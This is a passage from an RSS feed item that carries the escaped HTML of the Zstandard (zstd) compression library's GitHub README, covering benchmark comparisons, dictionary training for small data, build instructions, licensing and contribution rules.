&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;quicklz 1.5.0 -1&lt;/td&gt;
&lt;td&gt;2.238&lt;/td&gt;
&lt;td&gt;550 MB/s&lt;/td&gt;
&lt;td&gt;710 MB/s&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;lzo1x 2.09 -1&lt;/td&gt;
&lt;td&gt;2.108&lt;/td&gt;
&lt;td&gt;650 MB/s&lt;/td&gt;
&lt;td&gt;830 MB/s&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;lz4 1.8.1&lt;/td&gt;
&lt;td&gt;2.101&lt;/td&gt;
&lt;td&gt;750 MB/s&lt;/td&gt;
&lt;td&gt;3700 MB/s&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;snappy 1.1.4&lt;/td&gt;
&lt;td&gt;2.091&lt;/td&gt;
&lt;td&gt;530 MB/s&lt;/td&gt;
&lt;td&gt;1800 MB/s&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;lzf 3.6 -1&lt;/td&gt;
&lt;td&gt;2.077&lt;/td&gt;
&lt;td&gt;400 MB/s&lt;/td&gt;
&lt;td&gt;860 MB/s&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;Zstd can also offer stronger compression ratios at the cost of compression speed. Speed vs Compression trade-off is configurable by small increments. Decompression speed is preserved and remains roughly the same at all settings, a property shared by most LZ compression algorithms, such as &lt;a href=&quot;http://www.zlib.net/&quot; rel=&quot;nofollow&quot;&gt;zlib&lt;/a&gt; or lzma.&lt;/p&gt;
&lt;p&gt;The following tests were run on a server running Linux Debian (&lt;code&gt;Linux version 4.14.0-3-amd64&lt;/code&gt;) with a Core i7-6700K CPU @ 4.0GHz, using &lt;a href=&quot;https://github.com/inikep/lzbench&quot;&gt;lzbench&lt;/a&gt;, an open-source in-memory benchmark by @inikep compiled with &lt;a href=&quot;https://gcc.gnu.org/&quot; rel=&quot;nofollow&quot;&gt;gcc&lt;/a&gt; 7.3.0, on the &lt;a href=&quot;http://sun.aei.polsl.pl/~sdeor/index.php?page=silesia&quot; rel=&quot;nofollow&quot;&gt;Silesia compression corpus&lt;/a&gt;.&lt;/p&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Compression Speed vs Ratio&lt;/th&gt;
&lt;th&gt;Decompression Speed&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;a target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot; href=&quot;https://github.com/facebook/zstd/blob/dev/doc/images/CSpeed2.png&quot;&gt;&lt;img src=&quot;https://github.com/facebook/zstd/raw/dev/doc/images/CSpeed2.png&quot; alt=&quot;Compression Speed vs Ratio&quot; title=&quot;Compression Speed vs Ratio&quot;/&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot; href=&quot;https://github.com/facebook/zstd/blob/dev/doc/images/DSpeed3.png&quot;&gt;&lt;img src=&quot;https://github.com/facebook/zstd/raw/dev/doc/images/DSpeed3.png&quot; alt=&quot;Decompression Speed&quot; title=&quot;Decompression Speed&quot;/&gt;&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;A few other algorithms can produce higher compression ratios at slower speeds, falling outside of the graph. For a larger picture including slow modes, &lt;a href=&quot;https://github.com/facebook/zstd/blob/dev/doc/images/DCspeed5.png&quot;&gt;click on this link&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;The case for Small Data compression&lt;/h3&gt;
&lt;p&gt;Previous charts provide results applicable to typical file and stream scenarios (several MB). Small data comes with different perspectives.&lt;/p&gt;
&lt;p&gt;The smaller the amount of data to compress, the more difficult it is to compress. This problem is common to all compression algorithms, and reason is, compression algorithms learn from past data how to compress future data. But at the beginning of a new data set, there is no &quot;past&quot; to build upon.&lt;/p&gt;
&lt;p&gt;To solve this situation, Zstd offers a &lt;strong&gt;training mode&lt;/strong&gt;, which can be used to tune the algorithm for a selected type of data. Training Zstandard is achieved by providing it with a few samples (one file per sample). The result of this training is stored in a file called &quot;dictionary&quot;, which must be loaded before compression and decompression. Using this dictionary, the compression ratio achievable on small data improves dramatically.&lt;/p&gt;
&lt;p&gt;The following example uses the &lt;code&gt;github-users&lt;/code&gt; &lt;a href=&quot;https://github.com/facebook/zstd/releases/tag/v1.1.3&quot;&gt;sample set&lt;/a&gt;, created from &lt;a href=&quot;https://developer.github.com/v3/users/#get-all-users&quot;&gt;github public API&lt;/a&gt;. It consists of roughly 10K records weighing about 1KB each.&lt;/p&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Compression Ratio&lt;/th&gt;
&lt;th&gt;Compression Speed&lt;/th&gt;
&lt;th&gt;Decompression Speed&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;a target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot; href=&quot;https://github.com/facebook/zstd/blob/dev/doc/images/dict-cr.png&quot;&gt;&lt;img src=&quot;https://github.com/facebook/zstd/raw/dev/doc/images/dict-cr.png&quot; alt=&quot;Compression Ratio&quot; title=&quot;Compression Ratio&quot;/&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot; href=&quot;https://github.com/facebook/zstd/blob/dev/doc/images/dict-cs.png&quot;&gt;&lt;img src=&quot;https://github.com/facebook/zstd/raw/dev/doc/images/dict-cs.png&quot; alt=&quot;Compression Speed&quot; title=&quot;Compression Speed&quot;/&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot; href=&quot;https://github.com/facebook/zstd/blob/dev/doc/images/dict-ds.png&quot;&gt;&lt;img src=&quot;https://github.com/facebook/zstd/raw/dev/doc/images/dict-ds.png&quot; alt=&quot;Decompression Speed&quot; title=&quot;Decompression Speed&quot;/&gt;&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;These compression gains are achieved while simultaneously providing &lt;em&gt;faster&lt;/em&gt; compression and decompression speeds.&lt;/p&gt;
&lt;p&gt;Training works if there is some correlation in a family of small data samples. The more data-specific a dictionary is, the more efficient it is (there is no &lt;em&gt;universal dictionary&lt;/em&gt;). Hence, deploying one dictionary per type of data will provide the greatest benefits. Dictionary gains are mostly effective in the first few KB. Then, the compression algorithm will gradually use previously decoded content to better compress the rest of the file.&lt;/p&gt;
&lt;h4&gt;Dictionary compression How To:&lt;/h4&gt;
&lt;ol&gt;&lt;li&gt;Create the dictionary&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;code&gt;zstd --train FullPathToTrainingSet/* -o dictionaryName&lt;/code&gt;&lt;/p&gt;
&lt;ol start=&quot;2&quot;&gt;&lt;li&gt;Compress with dictionary&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;code&gt;zstd -D dictionaryName FILE&lt;/code&gt;&lt;/p&gt;
&lt;ol start=&quot;3&quot;&gt;&lt;li&gt;Decompress with dictionary&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;code&gt;zstd -D dictionaryName --decompress FILE.zst&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;Build instructions&lt;/h3&gt;
&lt;h4&gt;Makefile&lt;/h4&gt;
&lt;p&gt;If your system is compatible with standard &lt;code&gt;make&lt;/code&gt; (or &lt;code&gt;gmake&lt;/code&gt;), invoking &lt;code&gt;make&lt;/code&gt; in root directory will generate &lt;code&gt;zstd&lt;/code&gt; cli in root directory.&lt;/p&gt;
&lt;p&gt;Other available options include:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;make install&lt;/code&gt; : create and install zstd cli, library and man pages&lt;/li&gt;
&lt;li&gt;&lt;code&gt;make check&lt;/code&gt; : create and run &lt;code&gt;zstd&lt;/code&gt;, tests its behavior on local platform&lt;/li&gt;
&lt;/ul&gt;&lt;h4&gt;cmake&lt;/h4&gt;
&lt;p&gt;A &lt;code&gt;cmake&lt;/code&gt; project generator is provided within &lt;code&gt;build/cmake&lt;/code&gt;. It can generate Makefiles or other build scripts to create &lt;code&gt;zstd&lt;/code&gt; binary, and &lt;code&gt;libzstd&lt;/code&gt; dynamic and static libraries.&lt;/p&gt;
&lt;p&gt;By default, &lt;code&gt;CMAKE_BUILD_TYPE&lt;/code&gt; is set to &lt;code&gt;Release&lt;/code&gt;.&lt;/p&gt;
&lt;h4&gt;Meson&lt;/h4&gt;
&lt;p&gt;A Meson project is provided within &lt;code&gt;contrib/meson&lt;/code&gt;.&lt;/p&gt;
&lt;h4&gt;Visual Studio (Windows)&lt;/h4&gt;
&lt;p&gt;Going into &lt;code&gt;build&lt;/code&gt; directory, you will find additional possibilities:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Projects for Visual Studio 2005, 2008 and 2010.
&lt;ul&gt;&lt;li&gt;VS2010 project is compatible with VS2012, VS2013, VS2015 and VS2017.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Automated build scripts for Visual compiler by &lt;a href=&quot;https://github.com/KrzysFR&quot;&gt;@KrzysFR&lt;/a&gt;, in &lt;code&gt;build/VS_scripts&lt;/code&gt;, which will build &lt;code&gt;zstd&lt;/code&gt; cli and &lt;code&gt;libzstd&lt;/code&gt; library without any need to open Visual Studio solution.&lt;/li&gt;
&lt;/ul&gt;&lt;h3&gt;Status&lt;/h3&gt;
&lt;p&gt;Zstandard is currently deployed within Facebook. It is used continuously to compress large amounts of data in multiple formats and use cases. Zstandard is considered safe for production environments.&lt;/p&gt;
&lt;h3&gt;License&lt;/h3&gt;
&lt;p&gt;Zstandard is dual-licensed under &lt;a href=&quot;https://github.com/facebook/zstd/blob/dev/LICENSE&quot;&gt;BSD&lt;/a&gt; and &lt;a href=&quot;https://github.com/facebook/zstd/blob/dev/COPYING&quot;&gt;GPLv2&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;Contributing&lt;/h3&gt;
&lt;p&gt;The &quot;dev&quot; branch is the one where all contributions are merged before reaching &quot;master&quot;. If you plan to propose a patch, please commit into the &quot;dev&quot; branch, or its own feature branch. Direct commit to &quot;master&quot; are not permitted. For more information, please read &lt;a href=&quot;https://github.com/facebook/zstd/blob/dev/CONTRIBUTING.md&quot;&gt;CONTRIBUTING&lt;/a&gt;.&lt;/p&gt;
&lt;/article&gt;&lt;/div&gt;
</description>
<pubDate>Mon, 26 Nov 2018 02:41:46 +0000</pubDate>
<dc:creator>pierreneter</dc:creator>
<og:image>https://avatars0.githubusercontent.com/u/69631?s=400&amp;v=4</og:image>
<og:type>object</og:type>
<og:title>facebook/zstd</og:title>
<og:url>https://github.com/facebook/zstd</og:url>
<og:description>Zstandard - Fast real-time compression algorithm. Contribute to facebook/zstd development by creating an account on GitHub.</og:description>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://github.com/facebook/zstd</dc:identifier>
</item>
</channel>
</rss>